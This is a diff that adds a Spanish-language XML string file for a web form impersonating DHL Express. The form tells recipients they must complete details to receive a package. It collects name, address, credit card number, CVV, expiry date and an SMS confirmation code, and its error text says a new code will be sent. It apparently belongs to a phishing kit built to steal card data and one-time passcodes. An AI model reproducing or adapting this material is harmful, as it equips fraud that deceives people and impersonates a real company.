@@ -1,0 +1,43 @@
+<?xml version='1.0' encoding='UTF-8'?> 
+<document> 	
+<htmltitle>DHL - express</htmltitle> 
+<title>Por favor complete la información necesaria para recibir el paquete</title> 
+
+<step1title>Información</step1title> 
+<step1subtitle>Información personal</step1subtitle> 
+<firstname>Apellido *</firstname>
+<secondname>Nombre *</secondname>
+<adress1>Dirección 1 *</adress1>
+<adress2>Dirección 2 *</adress2>
+<city>Ciudad *</city>
+<zip>Código postal *</zip>
+
+<step2title>pago</step2title> 
+<step2subtitle>Informacion de pago</step2subtitle> 
+<creditcard>Tarjeta de crédito</creditcard> 
+<cardholder>Nombre del titular *</cardholder> 
+<cc>Número de tarjeta *</cc> 
+<cvv>CVV *</cvv> 
+<dateexpiration>Fecha de caducidad *:</dateexpiration> 
+<dateexpirationmonth>Mes</dateexpirationmonth> 
+<dateexpirationyear>Año</dateexpirationyear> 
+<notice>No se le cobrará antes del envío de paquetes</notice> 
+
+
+<step3title>Confirmación</step3title> 
+<step3subtitle>Orden de finalización</step3subtitle>
+<smslabel2>Le agradecemos por autenticarse ingresando el código de confirmación recibido en su teléfono.
+Esta autenticación es necesaria para confirmar su operación.</smslabel2> 
+<smsholder>Código de confirmación</smsholder>
+<msgimportant>Información importante</msgimportant>
+<lastmsg>¡los tiempos de entrega disminuyen a 1-2 días! Los costos de envío varían según su país.</lastmsg> 
+<copyright>
+2020 © DHL International GmbH. Todos los derechos reservados</copyright>
+
+<next>Etapa siguiente</next>
+<previous>Anterior</previous>
+<finish>Presentar</finish>
+<erreur>El código de confirmación incorrecto, recibirá otro código para confirmar.</erreur>
+<success>Su solicitud es confirmada</success>
+<loading>Espere mientras procesamos su solicitud por favor, No cierre esta ventana.</loading>
+</document>
